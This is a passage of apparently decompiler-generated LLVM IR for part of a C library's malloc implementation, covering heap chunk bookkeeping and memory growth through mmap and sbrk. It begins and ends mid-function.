dec_label_pc_14204:                               ; preds = %dec_label_pc_1420c.preheader, %dec_label_pc_14204
  %v2_1420859 = phi i32 [ %v2_14208, %dec_label_pc_14204 ], [ %ip.promoted, %dec_label_pc_1420c.preheader ]
  %v0_1420458 = phi i32 [ %v1_14204, %dec_label_pc_14204 ], [ %v0_1420457, %dec_label_pc_1420c.preheader ]
  %v1_14204 = add i32 %v0_1420458, 8
  %v2_14208 = mul i32 %v2_1420859, 2
  %v2_1420c = and i32 %v2_14208, %v0_14228
  %v4_1420c = icmp eq i32 %v2_1420c, 0
  br i1 %v4_1420c, label %dec_label_pc_14204, label %dec_label_pc_1420c.dec_label_pc_14214_crit_edge

dec_label_pc_1420c.dec_label_pc_14214_crit_edge:  ; preds = %dec_label_pc_14204
  store i32 %v1_14204, i32* %r0.global-to-local, align 4
  store i32 %v2_14208, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14214

dec_label_pc_14214:                               ; preds = %dec_label_pc_1420c.dec_label_pc_14214_crit_edge, %dec_label_pc_1420c.preheader
  %v0_14234 = phi i32 [ %v2_14208, %dec_label_pc_1420c.dec_label_pc_14214_crit_edge ], [ %ip.promoted, %dec_label_pc_1420c.preheader ]
  %v0_14258 = phi i32 [ %v1_14204, %dec_label_pc_1420c.dec_label_pc_14214_crit_edge ], [ %v0_1420457, %dec_label_pc_1420c.preheader ]
  %v1_14214 = add i32 %v0_14258, 12
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  %v3_14214 = load i32, i32* %v2_14214, align 4
  store i32 %v3_14214, i32* @lr, align 4
  %v9_14218 = icmp eq i32 %v3_14214, %v0_14258
  br i1 %v9_14218, label %dec_label_pc_14220, label %dec_label_pc_14240

dec_label_pc_14220:                               ; preds = %dec_label_pc_14214
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r0.global-to-local, align 4
  %v1_14224 = load i32, i32* @r8, align 4
  %v2_14224 = add i32 %v1_14224, ptrtoint (i32* @global_var_240f8.537 to i32)
  %v3_14224 = inttoptr i32 %v2_14224 to i32*
  %v4_14224 = load i32, i32* %v3_14224, align 4
  %v2_14228 = sub i32 -1, %v0_14234
  %v3_14228 = and i32 %v0_14228, %v2_14228
  store i32 %v3_14228, i32* @r4, align 4
  %v1_1422c = load i32, i32* @r5, align 4
  %v4_1422c = mul i32 %v1_1422c, 4
  %v5_1422c = add i32 %v4_1422c, %v4_14224
  store i32 %v5_1422c, i32* %r3.global-to-local, align 4
  %v1_14230 = add i32 %v0_14258, 8
  store i32 %v1_14230, i32* %r0.global-to-local, align 4
  %v2_14234 = mul i32 %v0_14234, 2
  store i32 %v2_14234, i32* %ip.global-to-local, align 4
  %v2_14238 = add i32 %v5_1422c, 820
  %v3_14238 = inttoptr i32 %v2_14238 to i32*
  store i32 %v3_14228, i32* %v3_14238, align 4
  %v0_141b8.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_141c0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_141b8

dec_label_pc_14240:                               ; preds = %dec_label_pc_14214
  %v1_14240 = add i32 %v3_14214, 4
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  %v3_14240 = load i32, i32* %v2_14240, align 4
  store i32 %v3_14240, i32* %r3.global-to-local, align 4
  %v1_14244 = and i32 %v3_14240, -4
  store i32 %v1_14244, i32* %r2.global-to-local, align 4
  %v0_14248 = load i32, i32* @sl, align 4
  %v2_14248 = sub i32 %v1_14244, %v0_14248
  store i32 %v2_14248, i32* %ip.global-to-local, align 4
  %v1_1424c = add i32 %v3_14214, 12
  %v2_1424c = inttoptr i32 %v1_1424c to i32*
  %v3_1424c = load i32, i32* %v2_1424c, align 4
  store i32 %v3_1424c, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_14248, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_14240
  %v6_14254 = add i32 %v1_14244, %v3_14214
  store i32 %v6_14254, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_14240, %bb146
  %v2_14258 = add i32 %v3_1424c, 8
  %v3_14258 = inttoptr i32 %v2_14258 to i32*
  store i32 %v0_14258, i32* %v3_14258, align 4
  %v0_1425c = load i32, i32* %r3.global-to-local, align 4
  %v1_1425c = load i32, i32* %r0.global-to-local, align 4
  %v2_1425c = add i32 %v1_1425c, 12
  %v3_1425c = inttoptr i32 %v2_1425c to i32*
  store i32 %v0_1425c, i32* %v3_1425c, align 4
  %v4_14260 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_1413c_crit_edge, label %dec_label_pc_1426c

.dec_label_pc_1413c_crit_edge:                    ; preds = %bb147
  %v5_14260 = add i32 %v4_14260, 8
  store i32 %v5_14260, i32* %r4.global-to-local, align 4
  %v4_14264 = load i32, i32* %r2.global-to-local, align 4
  %v5_14264 = add i32 %v4_14264, 4
  %v6_14264 = inttoptr i32 %v5_14264 to i32*
  %v7_14264 = load i32, i32* %v6_14264, align 4
  store i32 %v7_14264, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1413c

dec_label_pc_1426c:                               ; preds = %bb147
  %v1_1426c = load i32, i32* @sl, align 4
  %v2_1426c = add i32 %v1_1426c, %v4_14260
  store i32 %v2_1426c, i32* %r1.global-to-local, align 4
  %v1_14274 = load i32, i32* @r6, align 4
  %v2_14274 = add i32 %v1_14274, 8
  %v3_14274 = inttoptr i32 %v2_14274 to i32*
  store i32 %v2_1426c, i32* %v3_14274, align 4
  %v0_14278 = load i32, i32* %r1.global-to-local, align 4
  %v1_14278 = load i32, i32* @r6, align 4
  %v2_14278 = add i32 %v1_14278, 12
  %v3_14278 = inttoptr i32 %v2_14278 to i32*
  store i32 %v0_14278, i32* %v3_14278, align 4
  %v0_1427c = load i32, i32* @r6, align 4
  %v1_1427c = load i32, i32* %r1.global-to-local, align 4
  %v2_1427c = add i32 %v1_1427c, 8
  %v3_1427c = inttoptr i32 %v2_1427c to i32*
  store i32 %v0_1427c, i32* %v3_1427c, align 4
  %v0_14280 = load i32, i32* @r6, align 4
  %v1_14280 = load i32, i32* %r1.global-to-local, align 4
  %v2_14280 = add i32 %v1_14280, 12
  %v3_14280 = inttoptr i32 %v2_14280 to i32*
  store i32 %v0_14280, i32* %v3_14280, align 4
  %tmp213 = icmp ult i32 %v1_1426c, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_1426c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v8_1428c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v8_1428c, i32* %r3.global-to-local, align 4
  %v4_14290 = load i32, i32* %r1.global-to-local, align 4
  %v6_14290 = add i32 %v8_1428c, 48
  %v7_14290 = inttoptr i32 %v6_14290 to i32*
  store i32 %v4_14290, i32* %v7_14290, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_1426c, %bb148
  %v0_14294 = load i32, i32* @sl, align 4
  %v1_14294 = or i32 %v0_14294, 1
  store i32 %v1_14294, i32* %r2.global-to-local, align 4
  %v0_14298 = load i32, i32* %ip.global-to-local, align 4
  %v1_14298 = or i32 %v0_14298, 1
  store i32 %v1_14298, i32* %r3.global-to-local, align 4
  %v0_1429c = load i32, i32* @lr, align 4
  %v1_1429c = add i32 %v0_1429c, 8
  store i32 %v1_1429c, i32* %r4.global-to-local, align 4
  %v2_142a0 = add i32 %v0_1429c, 4
  %v3_142a0 = inttoptr i32 %v2_142a0 to i32*
  store i32 %v1_14294, i32* %v3_142a0, align 4
  %v0_142a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_142a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_142a4 = add i32 %v1_142a4, %v0_142a4
  %v4_142a4 = inttoptr i32 %v3_142a4 to i32*
  store i32 %v0_142a4, i32* %v4_142a4, align 4
  %v0_142a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_142a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_142a8 = add i32 %v1_142a8, 4
  %v3_142a8 = inttoptr i32 %v2_142a8 to i32*
  store i32 %v0_142a8, i32* %v3_142a8, align 4
  br label %dec_label_pc_14704

dec_label_pc_142b0.loopexit:                      ; preds = %dec_label_pc_141d0
  br label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %dec_label_pc_142b0.loopexit, %dec_label_pc_13ec4, %dec_label_pc_13ecc
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v4_142b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_142b8, i32* @r0, align 4
  %v1_142bc = add i32 %v4_142b8, 44
  %v2_142bc = inttoptr i32 %v1_142bc to i32*
  %v3_142bc = load i32, i32* %v2_142bc, align 4
  store i32 %v3_142bc, i32* %ip.global-to-local, align 4
  %v1_142c0 = add i32 %v3_142bc, 4
  %v2_142c0 = inttoptr i32 %v1_142c0 to i32*
  %v3_142c0 = load i32, i32* %v2_142c0, align 4
  %v0_142c4 = load i32, i32* @sl, align 4
  %v1_142c4 = add i32 %v0_142c4, 16
  store i32 %v1_142c4, i32* %r1.global-to-local, align 4
  %v1_142c8 = and i32 %v3_142c0, -4
  store i32 %v1_142c8, i32* %r3.global-to-local, align 4
  %v3_142cc = icmp ult i32 %v1_142c8, %v1_142c4
  br i1 %v3_142cc, label %dec_label_pc_142fc, label %dec_label_pc_142d8

dec_label_pc_142d8:                               ; preds = %dec_label_pc_142b0
  %v2_142d8 = sub i32 %v1_142c8, %v0_142c4
  %v2_142dc = add i32 %v0_142c4, %v3_142bc
  store i32 %v2_142dc, i32* %r1.global-to-local, align 4
  %v1_142e0 = or i32 %v2_142d8, 1
  store i32 %v1_142e0, i32* %r3.global-to-local, align 4
  %v1_142e4 = or i32 %v0_142c4, 1
  store i32 %v1_142e4, i32* %r2.global-to-local, align 4
  %v1_142e8 = add i32 %v3_142bc, 8
  store i32 %v1_142e8, i32* %r4.global-to-local, align 4
  store i32 %v1_142e4, i32* %v2_142c0, align 4
  %v0_142f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_142f0 = load i32, i32* @r0, align 4
  %v2_142f0 = add i32 %v1_142f0, 44
  %v3_142f0 = inttoptr i32 %v2_142f0 to i32*
  store i32 %v0_142f0, i32* %v3_142f0, align 4
  %v0_142f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_142f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_142f4 = add i32 %v1_142f4, 4
  %v3_142f4 = inttoptr i32 %v2_142f4 to i32*
  store i32 %v0_142f4, i32* %v3_142f4, align 4
  br label %dec_label_pc_14704

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142b0
  %v1_142fc = inttoptr i32 %v4_142b8 to i32*
  %v2_142fc = load i32, i32* %v1_142fc, align 4
  store i32 %v2_142fc, i32* %r3.global-to-local, align 4
  %v1_14300 = and i32 %v2_142fc, 2
  store i32 %v1_14300, i32* %ip.global-to-local, align 4
  %v2_14300 = icmp eq i32 %v1_14300, 0
  %v1_14304 = add i32 %v4_142b8, 860
  %v2_14304 = inttoptr i32 %v1_14304 to i32*
  %v3_14304 = load i32, i32* %v2_14304, align 4
  store i32 %v3_14304, i32* %r1.global-to-local, align 4
  br i1 %v2_14300, label %dec_label_pc_1431c, label %dec_label_pc_1430c

dec_label_pc_1430c:                               ; preds = %dec_label_pc_142fc
  %v0_1430c = call i32 @__malloc_consolidate()
  %v0_14310 = load i32, i32* @sl, align 4
  %v1_14310 = add i32 %v0_14310, -7
  store i32 %v1_14310, i32* @r0, align 4
  %v0_14314 = call i32 @malloc()
  store i32 %v0_14314, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14700

dec_label_pc_1431c:                               ; preds = %dec_label_pc_142fc
  %v1_1431c = add i32 %v4_142b8, 844
  %v2_1431c = inttoptr i32 %v1_1431c to i32*
  %v3_1431c = load i32, i32* %v2_1431c, align 4
  store i32 %v3_1431c, i32* %r3.global-to-local, align 4
  %v3_14320 = icmp ult i32 %v0_142c4, %v3_1431c
  %v1_14324 = add i32 %v3_14304, -1
  store i32 %v1_14324, i32* %sb.global-to-local, align 4
  br i1 %v3_14320, label %dec_label_pc_143f8, label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %dec_label_pc_1431c
  %v1_1432c = add i32 %v4_142b8, 852
  %v2_1432c = inttoptr i32 %v1_1432c to i32*
  %v3_1432c = load i32, i32* %v2_1432c, align 4
  store i32 %v3_1432c, i32* %r2.global-to-local, align 4
  %v1_14330 = add i32 %v4_142b8, 848
  %v2_14330 = inttoptr i32 %v1_14330 to i32*
  %v3_14330 = load i32, i32* %v2_14330, align 4
  store i32 %v3_14330, i32* %r3.global-to-local, align 4
  %v6_14338 = icmp slt i32 %v3_14330, %v3_1432c
  br i1 %v6_14338, label %dec_label_pc_1433c, label %dec_label_pc_143f8

dec_label_pc_1433c:                               ; preds = %dec_label_pc_1432c
  %v1_1433c = add i32 %v0_142c4, 10
  %v2_14340 = add i32 %v1_1433c, %v3_14304
  store i32 %v2_14340, i32* %r3.global-to-local, align 4
  %v2_14344 = sub i32 0, %v3_14304
  %v3_14344 = and i32 %v2_14340, %v2_14344
  store i32 %v3_14344, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_14344, %v0_142c4
  br i1 %tmp214, label %dec_label_pc_14350, label %dec_label_pc_143f8

dec_label_pc_14350:                               ; preds = %dec_label_pc_1433c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_14344, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_14368 = call i32 @mmap(i32 0, i32 %v3_14344, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_14368, i32* %r0.global-to-local, align 4
  %v7_1436c = icmp eq i32 %v6_14368, -1
  br i1 %v7_1436c, label %dec_label_pc_14350.dec_label_pc_143f8_crit_edge, label %dec_label_pc_14374

dec_label_pc_14350.dec_label_pc_143f8_crit_edge:  ; preds = %dec_label_pc_14350
  %v1_1441c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_143f8

dec_label_pc_14374:                               ; preds = %dec_label_pc_14350
  %v1_14374 = urem i32 %v6_14368, 8
  store i32 %v1_14374, i32* %r2.global-to-local, align 4
  %v2_14374 = icmp eq i32 %v1_14374, 0
  br i1 %v2_14374, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_14374
  %v2_14378 = sub nsw i32 8, %v1_14374
  store i32 %v2_14378, i32* %r3.global-to-local, align 4
  %v2_1437c = load i32, i32* @r4, align 4
  %v3_1437c = sub i32 %v2_1437c, %v2_14378
  %v3_14380 = add i32 %v2_14378, %v6_14368
  store i32 %v3_14380, i32* %lr.global-to-local, align 4
  %v2_14388 = or i32 %v3_1437c, 2
  store i32 %v2_14388, i32* %r2.global-to-local, align 4
  %v5_14390 = inttoptr i32 %v3_14380 to i32*
  store i32 %v2_14378, i32* %v5_14390, align 4
  %v1_14394 = load i32, i32* %r2.global-to-local, align 4
  %v2_14394 = load i32, i32* %lr.global-to-local, align 4
  %v3_14394 = add i32 %v2_14394, 4
  %v4_14394 = inttoptr i32 %v3_14394 to i32*
  store i32 %v1_14394, i32* %v4_14394, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_14374
  store i32 %v6_14368, i32* %lr.global-to-local, align 4
  %v1_1438c50 = load i32, i32* @r4, align 4
  %v2_1438c51 = or i32 %v1_1438c50, 2
  store i32 %v2_1438c51, i32* %r3.global-to-local, align 4
  %v3_14398 = inttoptr i32 %v6_14368 to i32*
  store i32 0, i32* %v3_14398, align 4
  %v1_1439c = load i32, i32* %r3.global-to-local, align 4
  %v2_1439c = load i32, i32* %lr.global-to-local, align 4
  %v3_1439c = add i32 %v2_1439c, 4
  %v4_1439c = inttoptr i32 %v3_1439c to i32*
  store i32 %v1_1439c, i32* %v4_1439c, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_143a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_143a8, i32* %ip.global-to-local, align 4
  %v1_143ac = add i32 %v4_143a8, 848
  %v2_143ac = inttoptr i32 %v1_143ac to i32*
  %v3_143ac = load i32, i32* %v2_143ac, align 4
  store i32 %v3_143ac, i32* %r3.global-to-local, align 4
  %v1_143b0 = add i32 %v4_143a8, 856
  %v2_143b0 = inttoptr i32 %v1_143b0 to i32*
  %v3_143b0 = load i32, i32* %v2_143b0, align 4
  store i32 %v3_143b0, i32* %r2.global-to-local, align 4
  %v1_143b4 = add i32 %v3_143ac, 1
  store i32 %v1_143b4, i32* %r3.global-to-local, align 4
  %v7_143bc = icmp sgt i32 %v1_143b4, %v3_143b0
  br i1 %v7_143bc, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_143b4, i32* %v2_143b0, align 4
  %v0_143c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_143c0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_143c0 = phi i32 [ %v4_143a8, %.thread30 ], [ %v1_143c0.pre, %bb150 ]
  %v0_143c0 = phi i32 [ %v1_143b4, %.thread30 ], [ %v0_143c0.pre, %bb150 ]
  %v2_143c0 = add i32 %v1_143c0, 848
  %v3_143c0 = inttoptr i32 %v2_143c0 to i32*
  store i32 %v0_143c0, i32* %v3_143c0, align 4
  %v0_143c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_143c4 = add i32 %v0_143c4, 868
  %v2_143c4 = inttoptr i32 %v1_143c4 to i32*
  %v3_143c4 = load i32, i32* %v2_143c4, align 4
  store i32 %v3_143c4, i32* %r3.global-to-local, align 4
  %v1_143c8 = add i32 %v0_143c4, 880
  %v2_143c8 = inttoptr i32 %v1_143c8 to i32*
  %v3_143c8 = load i32, i32* %v2_143c8, align 4
  store i32 %v3_143c8, i32* %r2.global-to-local, align 4
  %v0_143cc = load i32, i32* @r4, align 4
  %v2_143cc = add i32 %v0_143cc, %v3_143c4
  store i32 %v2_143cc, i32* %r1.global-to-local, align 4
  %v1_143d0 = add i32 %v0_143c4, 872
  %v2_143d0 = inttoptr i32 %v1_143d0 to i32*
  %v3_143d0 = load i32, i32* %v2_143d0, align 4
  store i32 %v3_143d0, i32* %r3.global-to-local, align 4
  %v1_143d8 = add i32 %v0_143c4, 884
  %v2_143d8 = inttoptr i32 %v1_143d8 to i32*
  %v3_143d8 = load i32, i32* %v2_143d8, align 4
  store i32 %v3_143d8, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_143cc, %v3_143c8
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_143cc, i32* %v2_143c8, align 4
  %v0_143e0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_143e0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_143e0 = phi i32 [ %v0_143c4, %bb151 ], [ %v1_143e0.pre, %bb152 ]
  %v0_143e0 = phi i32 [ %v2_143cc, %bb151 ], [ %v0_143e0.pre, %bb152 ]
  %v2_143e0 = add i32 %v1_143e0, 868
  %v3_143e0 = inttoptr i32 %v2_143e0 to i32*
  store i32 %v0_143e0, i32* %v3_143e0, align 4
  %v0_143e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_143e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_143e4 = add i32 %v1_143e4, %v0_143e4
  store i32 %v2_143e4, i32* %r1.global-to-local, align 4
  %v1_143e8 = load i32, i32* %r2.global-to-local, align 4
  %v0_143ec = load i32, i32* %lr.global-to-local, align 4
  %v1_143ec = add i32 %v0_143ec, 8
  store i32 %v1_143ec, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_143e4, %v1_143e8
  br i1 %tmp216, label %bb154, label %dec_label_pc_14700

bb154:                                            ; preds = %bb153
  %v5_143f0 = load i32, i32* %ip.global-to-local, align 4
  %v6_143f0 = add i32 %v5_143f0, 884
  %v7_143f0 = inttoptr i32 %v6_143f0 to i32*
  store i32 %v2_143e4, i32* %v7_143f0, align 4
  br label %dec_label_pc_14700

dec_label_pc_143f8:                               ; preds = %dec_label_pc_1433c, %dec_label_pc_1431c, %dec_label_pc_14350.dec_label_pc_143f8_crit_edge, %dec_label_pc_1432c
  %v1_1441c = phi i32 [ %v1_1441c.pre, %dec_label_pc_14350.dec_label_pc_143f8_crit_edge ], [ %v0_142c4, %dec_label_pc_1432c ], [ %v0_142c4, %dec_label_pc_1431c ], [ %v0_142c4, %dec_label_pc_1433c ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %ip.global-to-local, align 4
  %v4_14400 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_14400, i32* %r3.global-to-local, align 4
  %v1_14404 = add i32 %v4_14400, 44
  %v2_14404 = inttoptr i32 %v1_14404 to i32*
  %v3_14404 = load i32, i32* %v2_14404, align 4
  store i32 %v3_14404, i32* %r0.global-to-local, align 4
  %v1_14408 = add i32 %v4_14400, 864
  %v2_14408 = inttoptr i32 %v1_14408 to i32*
  %v3_14408 = load i32, i32* %v2_14408, align 4
  store i32 %v3_14408, i32* %r2.global-to-local, align 4
  %v1_1440c = add i32 %v4_14400, 840
  %v2_1440c = inttoptr i32 %v1_1440c to i32*
  %v3_1440c = load i32, i32* %v2_1440c, align 4
  store i32 %v3_1440c, i32* %r3.global-to-local, align 4
  %v1_14410 = add i32 %v3_14404, 4
  %v2_14410 = inttoptr i32 %v1_14410 to i32*
  %v3_14410 = load i32, i32* %v2_14410, align 4
  store i32 %v3_14410, i32* %r1.global-to-local, align 4
  %v1_14418 = urem i32 %v3_14408, 2
  %v2_14418 = icmp eq i32 %v1_14418, 0
  %v1_14414 = add i32 %v1_1441c, 16
  %v2_1441c = add i32 %v1_14414, %v3_1440c
  store i32 %v2_1441c, i32* %r3.global-to-local, align 4
  %v1_14420 = and i32 %v3_14410, -4
  store i32 %v1_14420, i32* @r8, align 4
  br i1 %v2_14418, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_143f8
  %v3_14424 = sub i32 %v2_1441c, %v1_14420
  store i32 %v3_14424, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_143f8, %bb155
  %v0_14428 = phi i32 [ %v2_1441c, %dec_label_pc_143f8 ], [ %v3_14424, %bb155 ]
  %v1_14428 = load i32, i32* %sb.global-to-local, align 4
  %v2_14428 = add i32 %v1_14428, %v0_14428
  store i32 %v2_14428, i32* %r3.global-to-local, align 4
  %v1_1442c = sub i32 -1, %v1_14428
  store i32 %v1_1442c, i32* %fp.global-to-local, align 4
  %v2_14430 = and i32 %v2_14428, %v1_1442c
  store i32 %v2_14430, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_14430, 1
  br i1 %tmp157, label %dec_label_pc_14454, label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %bb156
  store i32 %v2_14430, i32* %r0.global-to-local, align 4
  %v1_14444 = call i32 @__GI_sbrk(i32 %v2_14430)
  store i32 %v1_14444, i32* %r0.global-to-local, align 4
  %v3_14448 = icmp eq i32 %v1_14444, -1
  store i32 %v1_14444, i32* @r4, align 4
  br i1 %v3_14448, label %dec_label_pc_14454, label %dec_label_pc_144c0

dec_label_pc_14454:                               ; preds = %dec_label_pc_14440, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r1.global-to-local, align 4
  %v4_1445c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_1445c, i32* %r6.global-to-local, align 4
  %v1_14460 = add i32 %v4_1445c, 864
  %v2_14460 = inttoptr i32 %v1_14460 to i32*
  %v3_14460 = load i32, i32* %v2_14460, align 4
  store i32 %v3_14460, i32* %r3.global-to-local, align 4
  %v1_14464 = urem i32 %v3_14460, 2
  %v2_14464 = icmp eq i32 %v1_14464, 0
  br i1 %v2_14464, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_14454
  %v1_14468 = load i32, i32* @r8, align 4
  %v2_14468 = load i32, i32* %sb.global-to-local, align 4
  %v3_14468 = add i32 %v2_14468, %v1_14468
  %v2_1446c = load i32, i32* @r5, align 4
  %v3_1446c = add i32 %v3_14468, %v2_1446c
  store i32 %v3_1446c, i32* %r3.global-to-local, align 4
  %v2_14470 = load i32, i32* %fp.global-to-local, align 4
  %v3_14470 = and i32 %v2_14470, %v3_1446c
  store i32 %v3_14470, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_14454
  %v0_14474.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_14474 = phi i32 [ %v0_14474.pr, %.thread32thread-pre-split ], [ %v3_14470, %bb158 ]
  %v2_14474 = icmp ugt i32 %v0_14474, 1048575
  br i1 %v2_14474, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_1448c = phi i32 [ %v0_14474, %.thread32 ], [ 1048576, %bb159 ]
  %v1_1447c = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_1448c, %v1_1447c
  br i1 %tmp217, label %dec_label_pc_14484, label %dec_label_pc_146e8

dec_label_pc_14484:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1448c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_144a0 = call i32 @mmap(i32 0, i32 %v0_1448c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_144a0, i32* %r0.global-to-local, align 4
  %v3_144a4 = icmp eq i32 %v6_144a0, -1
  %v8_144a4 = icmp eq i32 %v6_144a0, -1
  store i32 %v6_144a0, i32* @r4, align 4
  br i1 %v8_144a4, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_14484
  %v1_144ac = load i32, i32* %r6.global-to-local, align 4
  %v2_144ac = add i32 %v1_144ac, 864
  %v3_144ac = inttoptr i32 %v2_144ac to i32*
  %v4_144ac = load i32, i32* %v3_144ac, align 4
  %v2_144b0 = load i32, i32* @r5, align 4
  %v3_144b0 = add i32 %v2_144b0, %v6_144a0
  store i32 %v3_144b0, i32* %r0.global-to-local, align 4
  %v2_144b4 = and i32 %v4_144ac, -2
  store i32 %v2_144b4, i32* %r3.global-to-local, align 4
  store i32 %v2_144b4, i32* %v3_144ac, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_14484, %bb161
  br i1 %v3_144a4, label %dec_label_pc_144c0, label %dec_label_pc_144c4

dec_label_pc_144c0:                               ; preds = %.thread35, %dec_label_pc_14440
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_144c4

dec_label_pc_144c4:                               ; preds = %.thread35, %dec_label_pc_144c0
  %v0_144c4 = load i32, i32* @r4, align 4
  %v7_144c4 = icmp eq i32 %v0_144c4, -1
  br i1 %v7_144c4, label %dec_label_pc_146e8, label %dec_label_pc_144cc

dec_label_pc_144cc:                               ; preds = %dec_label_pc_144c4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v4_144d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 64) to i32*), align 4
  store i32 %v4_144d4, i32* %ip.global-to-local, align 4
  store i32 %v3_14404, i32* %r2.global-to-local, align 4
  %v1_144dc = add i32 %v4_144d4, 872
  %v2_144dc = inttoptr i32 %v1_144dc to i32*
  %v3_144dc = load i32, i32* %v2_144dc, align 4
  %v1_144e0 = load i32, i32* @r8, align 4
  %v2_144e0 = add i32 %v1_144e0, %v3_14404
  store i32 %v2_144e0, i32* %r1.global-to-local, align 4
  %v0_144e4 = load i32, i32* @r5, align 4
  %v2_144e4 = add i32 %v0_144e4, %v3_144dc
  store i32 %v2_144e4, i32* %r3.global-to-local, align 4
  %v9_144e8 = icmp eq i32 %v0_144c4, %v2_144e0
  br i1 %v9_144e8, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_144cc
  store i32 %v2_144e4, i32* %v2_144dc, align 4
  br label %dec_label_pc_14504

bb162:                                            ; preds = %dec_label_pc_144cc
  %v1_144ec = load i32, i32* %r0.global-to-local, align 4
  %v8_144ec = icmp eq i32 %v1_144ec, -1
  store i32 %v2_144e4, i32* %v2_144dc, align 4
  br i1 %v8_144ec, label %.thread37, label %dec_label_pc_14504

.thread37:                                        ; preds = %bb162
  %v1_144f4 = load i32, i32* @r5, align 4
